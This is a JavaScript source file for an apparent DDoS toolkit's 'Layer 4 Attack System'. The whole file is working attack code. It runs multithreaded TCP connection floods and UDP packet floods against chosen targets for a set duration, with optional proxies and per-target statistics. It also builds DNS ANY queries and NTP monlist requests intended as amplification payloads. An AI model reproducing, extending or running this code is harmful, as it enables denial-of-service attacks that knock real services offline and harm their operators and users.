// worker/farmily4.js - Layer 4 Attack System
const fs = require('fs');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns');
const crypto = require('crypto');
const os = require('os');
const { performance } = require('perf_hooks');
const url = require('url');
const { promisify } = require('util');
const EventEmitter = require('events');
const cluster = require('cluster');
const { Worker } = require('worker_threads');
const path = require('path');

// Import shared utilities
const { 
    Logger, 
    GlobalResourceManager,
    ProxyManager,
    ThreadingManager,
    AdvancedUtils,
    Colors 
} = require('./shared');

// Global instances
const logger = new Logger('LAYER4');
const globalResourceManager = GlobalResourceManager.getInstance();

// Layer 4 specific configurations and utilities
class Layer4Config {
    constructor(options = {}) {
        this.targets = this.parseTargets(options.targets || []);
        this.method = options.method?.toUpperCase() || 'TCP';
        this.layer = 'LAYER4'; // Fixed for this module
        this.duration = options.duration || 60;
        this.threadsPerTarget = options.threadsPerTarget || Math.max(os.cpus().length, 10);
        this.maxConcurrentTargets = options.maxConcurrentTargets || 10;
        this.targetDelay = options.targetDelay || 0; // Delay between starting targets
        this.globalTimeout = options.globalTimeout || 5000;
        this.useProxies = options.useProxies || false;
        this.proxyList = options.proxyList || [];
        this.rampUpTime = options.rampUpTime || 0;
        this.coordinateTargets = options.coordinateTargets !== false;
        this.adaptiveScaling = options.adaptiveScaling !== false;
        this.resourceSharing = options.resourceSharing !== false;
        this.payloadSize = options.payloadSize || 1024;
        this.randomizePayload = options.randomizePayload !== false;
        this.packetRate = options.packetRate || 100; // Packets per second
        this.packetSize = options.packetSize || 1024; // Bytes per packet
        this.fragmentPackets = options.fragmentPackets || false;
        this.sourcePort = options.sourcePort || 0; // Random port if 0
        this.ttl = options.ttl || 64; // Time to live
        this.dnsAmplification = options.dnsAmplification || false;
        this.synFlood = options.synFlood || false;
        this.udpAmplification = options.udpAmplification || false;
        this.amplificationList = options.amplificationList || []; // List of amplification servers
    }

    parseTargets(targets) {
        if (typeof targets === 'string') {
            // Single target
            return [this.parseTarget(targets)];
        } else if (Array.isArray(targets)) {
            // Multiple targets
            return targets.map(target => this.parseTarget(target));
        } else {
            throw new Error('Targets must be a string or array of strings');
        }
    }

    parseTarget(target) {
        if (typeof target === 'string') {
            return {
                target: target,
                id: crypto.createHash('md5').update(target).digest('hex').substring(0, 8),
                weight: 1, // Equal weight by default
                priority: 1, // Equal priority by default
                customConfig: {},
                port: target.includes(':') ? parseInt(target.split(':')[1]) : 80, // Default port if not specified
                ip: target.includes(':') ? target.split(':')[0] : target // IP address or hostname
            };
        } else if (typeof target === 'object') {
            return {
                target: target.target,
                id: target.id || crypto.createHash('md5').update(target.target).digest('hex').substring(0, 8),
                weight: target.weight || 1,
                priority: target.priority || 1,
                customConfig: target.config || {},
                port: target.port || (target.target.includes(':') ? parseInt(target.target.split(':')[1]) : 80),
                ip: target.ip || (target.target.includes(':') ? target.target.split(':')[0] : target.target)
            };
        } else {
            throw new Error('Invalid target format');
        }
    }

    validate() {
        if (!this.targets || this.targets.length === 0) {
            throw new Error('At least one target is required');
        }

        this.targets.forEach((target, index) => {
            if (!target.target) {
                throw new Error(`Target ${index} is missing target URL`);
            }
        });

        const validMethods = ['TCP', 'UDP'];
        if (!validMethods.includes(this.method)) {
            throw new Error(`Invalid method for LAYER4: ${this.method}. Must be one of: ${validMethods.join(', ')}`);
        }

        if (this.duration <= 0) throw new Error('Duration must be positive');
        if (this.threadsPerTarget <= 0) throw new Error('Threads per target must be positive');
        if (this.packetRate <= 0) throw new Error('Packet rate must be positive');
        if (this.packetSize <= 0) throw new Error('Packet size must be positive');

        return true;
    }

    getTargetConfig(targetId) {
        const target = this.targets.find(t => t.id === targetId);
        return target ? {
            ...this,
            target: target.target,
            weight: target.weight,
            priority: target.priority,
            customConfig: target.customConfig
        } : null;
    }
}

// Layer 4 Attack Engine
class Layer4Attack extends EventEmitter {
    constructor(config) {
        super();
        this.config = new Layer4Config(config);
        this.config.validate();
        
        this.resourceManager = globalResourceManager;
        this.proxyManager = new ProxyManager();
        this.threadingManager = new ThreadingManager();
        
        this.attackId = crypto.randomUUID().substring(0, 8);
        this.isRunning = false;
        this.shouldStop = false;
        this.resolvedTargets = new Map();
        this.connections = new Map();
        this.packets = {
            sent: 0,
            failed: 0,
            bytes: 0
        };
        
        if (this.config.useProxies && this.config.proxyList.length > 0) {
            this.proxyManager.loadProxies(this.config.proxyList);
        }
    }

    async start() {
        if (this.isRunning) {
            throw new Error('Attack is already running');
        }

        this.isRunning = true;
        this.shouldStop = false;
        
        logger.info(`Starting Layer 4 attack ${this.attackId}`, this.attackId);
        logger.info(`Targets: ${this.config.targets.length}, Method: ${this.config.method}`, this.attackId);
        
        try {
            // Register with global resource manager
            this.resourceManager.registerAttack(this.attackId, this);
            
            // Resolve targets
            logger.info('Resolving targets...', this.attackId);
            this.resolvedTargets = await this.resolveTargets(this.config.targets);
            
            // Initialize statistics
            this.initializeStats();
            
            // Execute attack based on configuration
            if (this.config.method === 'TCP') {
                await this.executeTCPAttack();
            } else if (this.config.method === 'UDP') {
                await this.executeUDPAttack();
            }
            
            logger.success(`Layer 4 attack ${this.attackId} completed`, this.attackId);
            this.printSummaryReport();
            
            return this.getAttackStats();
            
        } catch (error) {
            logger.error(`Layer 4 attack failed: ${error.message}`, this.attackId);
            throw error;
        } finally {
            await this.cleanup();
        }
    }

    async resolveTargets(targets) {
        return await AdvancedUtils.resolveTargets(targets);
    }

    initializeStats() {
        this.startTime = performance.now();
        this.packets = {
            sent: 0,
            failed: 0,
            bytes: 0
        };
        
        // Initialize per-target stats
        this.targetStats = new Map();
        this.config.targets.forEach(target => {
            this.targetStats.set(target.id, {
                sent: 0,
                failed: 0,
                bytes: 0,
                connections: 0,
                startTime: performance.now()
            });
        });
        
        // Start stats monitoring
        this.statsInterval = setInterval(() => {
            this.emitStats();
        }, 1000);
    }

    emitStats() {
        const currentTime = performance.now();
        const duration = (currentTime - this.startTime) / 1000; // in seconds
        
        const totalStats = {
            attackId: this.attackId,
            duration: duration.toFixed(2),
            packetsSent: this.packets.sent,
            packetsPerSecond: (this.packets.sent / duration).toFixed(2),
            bytesSent: this.packets.bytes,
            bytesPerSecond: (this.packets.bytes / duration).toFixed(2),
            bandwidth: AdvancedUtils.formatBytes(this.packets.bytes / duration) + '/s',
            failureRate: this.packets.sent > 0 ? (this.packets.failed / this.packets.sent * 100).toFixed(2) + '%' : '0%',
            targets: []
        };
        
        this.targetStats.forEach((stats, targetId) => {
            const targetDuration = (currentTime - stats.startTime) / 1000;
            totalStats.targets.push({
                targetId,
                target: this.config.targets.find(t => t.id === targetId)?.target,
                packetsSent: stats.sent,
                packetsPerSecond: (stats.sent / targetDuration).toFixed(2),
                bytesSent: stats.bytes,
                bytesPerSecond: (stats.bytes / targetDuration).toFixed(2),
                bandwidth: AdvancedUtils.formatBytes(stats.bytes / targetDuration) + '/s',
                connections: stats.connections
            });
        });
        
        this.emit('stats-update', totalStats);
    }

    async executeTCPAttack() {
        logger.info('Executing TCP attack', this.attackId);
        
        const attackPromises = [];
        
        for (const target of this.config.targets) {
            if (this.shouldStop) break;
            
            const targetInfo = this.resolvedTargets.get(target.id);
            if (!targetInfo) {
                logger.error(`Failed to resolve target ${target.target}`, this.attackId);
                continue;
            }
            
            // Calculate number of threads for this target
            const threads = Math.min(
                this.config.threadsPerTarget,
                this.resourceManager.resourceLimits.maxThreadsPerAttack
            );
            
            logger.info(`Starting TCP attack on ${targetInfo.ip}:${targetInfo.port} with ${threads} threads`, this.attackId);
            
            // Start threads for this target
            for (let i = 0; i < threads; i++) {
                attackPromises.push(this.runTCPThread(targetInfo, target.id, i));
            }
        }
        
        // Wait for attack duration
        const timeoutPromise = AdvancedUtils.sleep(this.config.duration * 1000)
            .then(() => { this.shouldStop = true; });
            
        await Promise.race([
            Promise.allSettled(attackPromises),
            timeoutPromise
        ]);
        
        this.shouldStop = true;
    }

    async runTCPThread(targetInfo, targetId, threadId) {
        const threadName = `TCP-${targetId}-${threadId}`;
        logger.debug(`Starting thread ${threadName}`, this.attackId);
        
        let activeConnections = 0;
        const maxConnectionsPerThread = 50; // Limit connections per thread
        
        while (!this.shouldStop) {
            try {
                // Limit connections per thread
                if (activeConnections >= maxConnectionsPerThread) {
                    await AdvancedUtils.sleep(100);
                    continue;
                }
                
                // Create TCP socket
                const socket = new net.Socket();
                socket.setTimeout(this.config.globalTimeout);
                
                // Prepare payload
                const payload = this.generateTCPPayload();
                
                // Track this connection
                const connectionId = crypto.randomUUID().substring(0, 8);
                this.connections.set(connectionId, {
                    socket,
                    targetId,
                    threadId,
                    created: Date.now()
                });
                
                activeConnections++;
                
                // Update target stats
                const stats = this.targetStats.get(targetId);
                if (stats) {
                    stats.connections++;
                }
                
                // Connection handlers
                socket.on('connect', () => {
                    try {
                        // Send payload on connect
                        socket.write(payload);
                        
                        // Update stats
                        this.packets.sent++;
                        this.packets.bytes += payload.length;
                        
                        if (stats) {
                            stats.sent++;
                            stats.bytes += payload.length;
                        }
                        
                        // SYN flood - close immediately
                        if (this.config.synFlood) {
                            socket.destroy();
                            activeConnections--;
                            this.connections.delete(connectionId);
                        }
                    } catch (err) {
                        this.packets.failed++;
                        if (stats) stats.failed++;
                        socket.destroy();
                    }
                });
                
                socket.on('error', () => {
                    this.packets.failed++;
                    if (stats) stats.failed++;
                    socket.destroy();
                    activeConnections--;
                    this.connections.delete(connectionId);
                });
                
                socket.on('timeout', () => {
                    socket.destroy();
                    activeConnections--;
                    this.connections.delete(connectionId);
                });
                
                socket.on('close', () => {
                    activeConnections--;
                    this.connections.delete(connectionId);
                });
                
                // Connect to target
                socket.connect(targetInfo.port, targetInfo.ip);
                
                // Apply rate limiting if configured
                if (this.config.packetRate > 0) {
                    const delay = 1000 / this.config.packetRate;
                    await AdvancedUtils.sleep(delay);
                }
            } catch (error) {
                logger.debug(`Thread ${threadName} error: ${error.message}`, this.attackId);
                await AdvancedUtils.sleep(1000); // Backoff on error
            }
        }
        
        logger.debug(`Thread ${threadName} completed`, this.attackId);
    }

    async executeUDPAttack() {
        logger.info('Executing UDP attack', this.attackId);
        
        const attackPromises = [];
        
        for (const target of this.config.targets) {
            if (this.shouldStop) break;
            
            const targetInfo = this.resolvedTargets.get(target.id);
            if (!targetInfo) {
                logger.error(`Failed to resolve target ${target.target}`, this.attackId);
                continue;
            }
            
            // Calculate number of threads for this target
            const threads = Math.min(
                this.config.threadsPerTarget,
                this.resourceManager.resourceLimits.maxThreadsPerAttack
            );
            
            logger.info(`Starting UDP attack on ${targetInfo.ip}:${targetInfo.port} with ${threads} threads`, this.attackId);
            
            // Start threads for this target
            for (let i = 0; i < threads; i++) {
                attackPromises.push(this.runUDPThread(targetInfo, target.id, i));
            }
        }
        
        // Wait for attack duration
        const timeoutPromise = AdvancedUtils.sleep(this.config.duration * 1000)
            .then(() => { this.shouldStop = true; });
            
        await Promise.race([
            Promise.allSettled(attackPromises),
            timeoutPromise
        ]);
        
        this.shouldStop = true;
    }

    async runUDPThread(targetInfo, targetId, threadId) {
        const threadName = `UDP-${targetId}-${threadId}`;
        logger.debug(`Starting thread ${threadName}`, this.attackId);
        
        // Create UDP socket
        const socket = dgram.createSocket('udp4');
        
        // Handle errors
        socket.on('error', (err) => {
            logger.debug(`UDP socket error: ${err.message}`, this.attackId);
            socket.close();
        });
        
        while (!this.shouldStop) {
            try {
                // Generate payload
                let payload;
                
                if (this.config.dnsAmplification) {
                    payload = this.generateDNSAmplificationPayload();
                } else if (this.config.udpAmplification) {
                    payload = this.generateUDPAmplificationPayload();
                } else {
                    payload = this.generateUDPPayload();
                }
                
                // Send packet
                socket.send(payload, targetInfo.port, targetInfo.ip, (err) => {
                    if (err) {
                        this.packets.failed++;
                        const stats = this.targetStats.get(targetId);
                        if (stats) stats.failed++;
                    } else {
                        this.packets.sent++;
                        this.packets.bytes += payload.length;
                        
                        const stats = this.targetStats.get(targetId);
                        if (stats) {
                            stats.sent++;
                            stats.bytes += payload.length;
                        }
                    }
                });
                
                // Apply rate limiting if configured
                if (this.config.packetRate > 0) {
                    const delay = 1000 / this.config.packetRate;
                    await AdvancedUtils.sleep(delay);
                }
            } catch (error) {
                logger.debug(`Thread ${threadName} error: ${error.message}`, this.attackId);
                await AdvancedUtils.sleep(1000); // Backoff on error
            }
        }
        
        // Cleanup
        socket.close();
        logger.debug(`Thread ${threadName} completed`, this.attackId);
    }

    generateTCPPayload() {
        const size = this.config.packetSize || 1024;
        return this.config.randomizePayload ? 
            crypto.randomBytes(size) : 
            Buffer.alloc(size, 'A');
    }

    generateUDPPayload() {
        const size = this.config.packetSize || 1024;
        return this.config.randomizePayload ? 
            crypto.randomBytes(size) : 
            Buffer.alloc(size, 'A');
    }

    generateDNSAmplificationPayload() {
        // DNS Query packet with recursion desired flag
        const buffer = Buffer.alloc(this.config.packetSize || 40);
        
        // Transaction ID (16 bits)
        buffer.writeUInt16BE(Math.floor(Math.random() * 65535), 0);
        
        // Flags (16 bits) - Standard query with recursion desired
        buffer.writeUInt16BE(0x0100, 2);
        
        // Questions count (16 bits) - 1 question
        buffer.writeUInt16BE(1, 4);
        
        // Answer RRs, Authority RRs, Additional RRs (16 bits each) - 0
        buffer.writeUInt16BE(0, 6);
        buffer.writeUInt16BE(0, 8);
        buffer.writeUInt16BE(0, 10);
        
        // Query - example.com (or any domain that might cause amplification)
        let offset = 12;
        const domain = 'example.com';
        const parts = domain.split('.');
        
        for (const part of parts) {
            buffer.writeUInt8(part.length, offset++);
            buffer.write(part, offset, part.length);
            offset += part.length;
        }
        
        buffer.writeUInt8(0, offset++); // Root domain
        
        // Query Type (16 bits) - ANY (255)
        buffer.writeUInt16BE(255, offset);
        offset += 2;
        
        // Query Class (16 bits) - IN (1)
        buffer.writeUInt16BE(1, offset);
        
        return buffer;
    }

    generateUDPAmplificationPayload() {
        // NTP Monlist request (causes amplification)
        const buffer = Buffer.alloc(this.config.packetSize || 48);
        
        // NTP Mode 7 packet
        buffer.writeUInt8(0x17, 0); // LI, VN, Mode (Mode 7)
        buffer.writeUInt8(0x00, 1); // Auth, Seq, Impl, Op (Get Monlist)
        buffer.writeUInt16BE(0, 2);  // Sequence
        buffer.writeUInt16BE(0, 4);  // Status
        buffer.writeUInt16BE(0, 6);  // Association ID
        buffer.writeUInt16BE(0, 8);  // Offset
        buffer.writeUInt16BE(0, 10); // Count
        
        // The rest of the packet can be filled with random bytes
        for (let i = 12; i < buffer.length; i++) {
            buffer.writeUInt8(Math.floor(Math.random() * 255), i);
        }
        
        return buffer;
    }

    async stop() {
        logger.info(`Stopping Layer 4 attack ${this.attackId}`, this.attackId);
        this.shouldStop = true;
        await this.cleanup();
    }

    async cleanup() {
        this.isRunning = false;
        
        // Close all connections
        for (const connection of this.connections.values()) {
            if (connection.socket && !connection.socket.destroyed) {
                connection.socket.destroy();
            }
        }
        
        this.connections.clear();
        
        // Stop stats monitoring
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
        }
        
        // Unregister from global resource manager
        this.resourceManager.unregisterAttack(this.attackId);
        
        logger.debug(`Cleanup completed for attack ${this.attackId}`, this.attackId);
    }

    printSummaryReport() {
        const stats = this.getAttackStats();
        
        console.log(`\n${Colors.CYAN}${Colors.BOLD}=== LAYER 4 ATTACK SUMMARY ===${Colors.RESET}`);
        console.log(`${Colors.WHITE}Attack ID: ${Colors.GREEN}${this.attackId}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Method: ${Colors.GREEN}${this.config.method}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Duration: ${Colors.GREEN}${stats.duration} seconds${Colors.RESET}`);
        console.log(`${Colors.WHITE}Packets Sent: ${Colors.GREEN}${stats.packetsSent}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Packets/sec: ${Colors.GREEN}${stats.packetsPerSecond}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Bandwidth: ${Colors.GREEN}${stats.bandwidth}${Colors.RESET}`);
        
        if (stats.targets.length > 0) {
            console.log(`\n${Colors.CYAN}Target Details:${Colors.RESET}`);
            stats.targets.forEach(target => {
                console.log(`  ${Colors.WHITE}${target.target}: ${target.packetsPerSecond} packets/sec, ${target.bandwidth}${Colors.RESET}`);
            });
        }
        
        console.log(`${Colors.CYAN}${Colors.BOLD}=======================================\n${Colors.RESET}`);
    }

    getAttackStats() {
        const currentTime = performance.now();
        const duration = (currentTime - this.startTime) / 1000; // in seconds
        
        return {
            attackId: this.attackId,
            method: this.config.method,
            layer: 'LAYER4',
            duration: duration.toFixed(2),
            packetsSent: this.packets.sent,
            packetsPerSecond: (this.packets.sent / duration).toFixed(2),
            bytesSent: this.packets.bytes,
            bytesPerSecond: (this.packets.bytes / duration).toFixed(2),
            bandwidth: AdvancedUtils.formatBytes(this.packets.bytes / duration) + '/s',
            failureRate: this.packets.sent > 0 ? (this.packets.failed / this.packets.sent * 100).toFixed(2) + '%' : '0%',
            targets: Array.from(this.targetStats.entries()).map(([targetId, stats]) => {
                const targetDuration = (currentTime - stats.startTime) / 1000;
                const target = this.config.targets.find(t => t.id === targetId);
                return {
                    targetId,
                    target: target?.target,
                    packetsSent: stats.sent,
                    packetsPerSecond: (stats.sent / targetDuration).toFixed(2),
                    bytesSent: stats.bytes,
                    bytesPerSecond: (stats.bytes / targetDuration).toFixed(2),
                    bandwidth: AdvancedUtils.formatBytes(stats.bytes / targetDuration) + '/s'
                };
            })
        };
    }
}

// Helper methods for layer 4 specific functionality
function createTCPAttack(targets, duration, options = {}) {
    const config = {
        targets,
        method: 'TCP',
        layer: 'LAYER4',
        duration,
        ...options
    };
    
    return new Layer4Attack(config);
}

function createUDPAttack(targets, duration, options = {}) {
    const config = {
        targets,
        method: 'UDP',
        layer: 'LAYER4',
        duration,
        ...options
    };
    
    return new Layer4Attack(config);
}

// Export Layer 4 specific functionality
module.exports = {
    // Main attack classes
    Layer4Attack,
    Layer4Config,
    
    // Helper functions
    createTCPAttack,
    createUDPAttack,
    
    // Layer 4 specific utilities
    generateDNSAmplificationPayload: Layer4Attack.prototype.generateDNSAmplificationPayload,
    generateUDPAmplificationPayload: Layer4Attack.prototype.generateUDPAmplificationPayload,
};